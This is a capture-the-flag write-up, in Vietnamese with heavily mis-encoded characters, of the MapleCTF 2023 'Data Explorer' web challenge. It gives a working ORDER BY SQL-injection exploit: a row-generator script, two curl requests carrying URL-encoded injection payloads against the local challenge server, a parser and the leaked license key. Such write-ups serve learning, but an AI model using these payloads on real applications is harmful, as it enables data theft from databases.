---
title: Data Explorer
description: 'Date: July 4, 2023 1:00 PM (EDT)'
date: 2026-01-03
tags:
  - writeup
  - sqli
  - file-upload
category: web
ctf_event: Mablectf2023
draft: false
---

import Callout from '@/components/mdx/Callout.astro';

Date: July 4, 2023 1:00 PM (EDT)
Status: Not started

## Summary

<Callout type="note" title="Note">
ğŸ’¡ SQLinjection, Use **order by**

</Callout>

## Description

- BÃ i nÃ y, mÃ¬nh khÃ´ng lÃ m Ä‘Æ°á»£c khi giáº£i Ä‘ang diá»…n ra. Sau khi, giáº£i káº¿t thÃºc mÃ¬nh Ä‘á»c writeup vÃ  lÆ°u láº¡i theo cÃ¡ch hiá»ƒu cá»§a mÃ¬nh.

## Analyst

- Äáº§u tiÃªn bÃ i nÃ y, Ä‘á»c src code cÃ³ thá»ƒ tháº¥y ngay lá»— há»•ng SQLi tuy nhiÃªn láº¡i bá»‹ strict filter nÃªn viá»‡c táº¥n cÃ´ng SQL lÃ  khÃ´ng thá»ƒ.
- Tuy nhiÃªn, náº¿u Ä‘á»c file [run.sh](http://run.sh) nháº­n tháº¥y cÃ³ **PYTHONOPTIMIZE=1 ? HIá»‚U LÃ€ GÃŒ?**

![Untitled](/uploads/data-explorer/data-explorer/untitled.png)

- Äá»c qua thÃ¬ cÃ³ thá»ƒ hiá»ƒu giÃ¡ trá»‹ nÃ y sáº½ disable assert trong python.

![Untitled](/uploads/data-explorer/data-explorer/untitled-1.png)

- Tá»« Ä‘áº¥y ta cÃ³ Ã½ tÆ°á»Ÿng táº¥n cÃ´ng hÃ m filter_order khi khÃ´ng cáº§n ASC, DESC.
- Ã tÆ°á»Ÿng chÃ­nh cá»§a bÃ i nÃ y lÃ  ta sáº½ sá»­ dá»¥ng order by sort trÃªn 1 additional column Ä‘á»ƒ xÃ¡c Ä‘á»‹nh kÃ½ tá»± vÃ  trÃªn 1 order Ä‘á»ƒ xÃ¡c Ä‘á»‹nh vá»‹ trÃ­ trong key cá»§a license.
  - Cháº³ng háº¡n nhÆ° sau: ta cÃ³ key lÃ  : abc
  - Ta cÃ³ table lÃ :
    | aaa | pos |
    | --- | --- |
    | a   | 1   |
    | a   | 2   |
    | a   | 3   |
    | a   | 4   |
    | a   | 5   |
    | a   | 6   |
  - Ta order by substr(â€™abcâ€™ || key, 1),pos â†’ thÃ¬ má»—i giÃ¡ trá»‹ sáº½ Ä‘Æ°á»£c gÃ¡n theo báº£ng chá»¯ cÃ¡i + key
    | aaa | pos | addition col |
    | --- | --- | ------------ |
    | a   | 1   | a            |
    | a   | 2   | b            |
    | a   | 3   | c            |
    | a   | 4   | a            |
    | a   | 5   | b            |
    | a   | 6   | c            |
  - Sau Ä‘Ã³ nÃ³ sáº½ Ä‘Æ°á»£c sort theo addition col, r sau Ä‘Ã³ sáº½ sort theo pos â†’ Tá»« Ä‘Ã³ ta sáº½ cÃ³ cÃ¡c kÃ½ tá»± tÆ°Æ¡ng á»©ng theo tá»«ng vá»‹ trÃ­.
    | aaa | pos | addition col |
    | --- | --- | ------------ |
    | a   | 1   | a            |
    | a   | 4   | a            |
    | a   | 2   | b            |
    | a   | 5   | b            |
    | a   | 3   | c            |
    | a   | 6   | c            |

## Exploit

- Äá»ƒ nháº­n biáº¿t Ä‘Æ°á»£c kÃ½ tá»± nÃ o khi sort ta sáº½ cáº§n thÃªm cÃ¡c row â€˜0-9â€™ + â€˜a-fâ€™ â†’ Tá»ª ÄÃ“ 1 file create cá»§a ta sáº½ cÃ³ 128 + 16 = 144 row.
- generate file.txt

```jsx
with open("exploit.txt", "w+") as f:
  f.write("aaa,pos\n")
  for i in range(1,145):
    f.write(f"a,{i}\n")
```

- Tá»‘i Ä‘a 1 query sáº½ cÃ³ 200 row mÃ  key cá»§a cta lÃ  256 kÃ½ tá»±. Ta cáº§n thá»±c hiá»‡n 2 query Ä‘á»ƒ cÃ³ thá»ƒ láº¥y háº¿t Ä‘Æ°á»£c key. Tuy nhiÃªn khi create báº£ng sáº½ bá»‹ redirect vÃ  máº¥t 1 query nÃªn ta sáº½ sá»­ dá»¥ng curl, Ä‘á»ƒ k bá»‹ redirect.

<Callout type="note" title="Note">
ğŸ’¡ curl '[http://0.0.0.0:8000/view/686220e0-6aa2-47d2-849d-7cbc2b05799e](http://0.0.0.0:8000/view/686220e0-6aa2-47d2-849d-7cbc2b05799e)' --data-raw 'order-col=aaa&order-od=%2C+%28select+substr%28%270123456789abcdef%27+%7C%7C+substr%28key%2C%201%29%2C+pos%2C+1%29+from+license%29%2C+pos' > [x.in](http://x.in/)

</Callout>

<Callout type="note" title="Note">
ğŸ’¡ curl '[http://0.0.0.0:8000/view/5e8196d3-36e2-405f-bc99-23976cb97845](http://0.0.0.0:8000/view/5e8196d3-36e2-405f-bc99-23976cb97845)' --data-raw 'order-col=aaa&order-od=%2C+%28select+substr%28%270123456789abcdef%27+%7C%7C+substr%28key%2C%20129%29%2C+pos%2C+1%29+from+license%29%2C+pos' > [x.in](http://x.in/)

</Callout>

- code Ä‘á»ƒ láº¥y key. Ã tÆ°á»Ÿng cá»§a code, vÃ¬ sort theo cÃ¡c kÃ½ tá»± trc, sau Ä‘Ã³ má»›i Ä‘áº¿n sá»‘ thá»© tá»±, nÃªn ta cáº§n pháº£i cÃ³ 1 cÃ¡ch Ä‘á»ƒ nháº­n biáº¿t Ä‘Æ°á»£c kÃ½ tá»± nÃ o vá»›i kÃ½ tá»± nÃ o. VÃ¬ váº­y ta sáº½ up lÃªn file 144 row thÃªm 16 kÃ½ tá»± Ä‘á»ƒ lÃ m má»‘c. DÃ² theo tá»«ng má»‘c lÃ  xÄ‘inh Ä‘Æ°á»£c tá»«ng kÃ½ tá»±.

```jsx
import re
data = open('x.in', 'r').read()
pattern = r'<td>(\d+)</td>'
test = matches = re.findall(pattern, data)
poss = [int(x) for x in test]
abc = '0123456789abcdef'
print(len(abc))
index = 0
d = ['x']*128
print(d)
for pos in poss:
    print(index, pos)
    if index+1 == pos and index<=15:
        index += 1
    else:
        d[pos-17] = abc[index-1]
print("".join(d))

#key: 36d35d32d1c43cfc1d3342d5992f0a9f6b1d32325fc9fb4c640c97ab81ad0b4df8b3232a37aa2aef5d04e501466fa04760fc3b2abf1a076215f8653bf830b568de0c7f103c05c23ca88ef88fb72eeb589ca824c428423a0c1dafffc87cd2d1621d8fcab51a376c9d97cb2016efa034d9ee9cc3f510652ab85ecf20816e0c5453

# 36d35d32d1c43cfc1d3342d5992f0a9f6b1d32325fc9fb4c640c97ab81ad0b4df8b3232a37aa2aef5d04e501466fa04760fc3b2abf1a076215f8653bf830b568de0c7f103c05c23ca88ef88fb72eeb589ca824c428423a0c1dafffc87cd2d1621d8fcab51a376c9d97cb2016efa034d9ee9cc3f510652ab85ecf20816e0c5453
```

## Result

## REF

[MapleCTF 2023 - Data Explorer](https://zimzi.substack.com/p/maplectf-2023-data-explorer)
